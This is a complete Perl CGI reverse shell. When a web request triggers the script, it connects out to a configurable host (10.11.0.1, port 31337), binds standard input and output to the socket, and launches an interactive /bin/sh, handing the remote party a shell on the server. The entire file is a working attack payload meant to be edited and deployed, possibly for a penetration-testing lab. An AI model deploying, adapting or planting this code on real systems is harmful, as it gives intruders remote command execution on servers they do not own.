#!/usr/bin/perl
use strict;
use Socket;

# To change 
$lport = "31337";
$lhost = "10.11.0.1";

# Executed
print "Content-type: text/html\n\n";
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if(connect(S,sockaddr_in($lport, inet_aton($lhost)))) {
  open(STDIN, ">&S");
  open(STDOUT, ">&S");
  open(STDERR, ">&S");

  exec("/bin/sh -i");
};
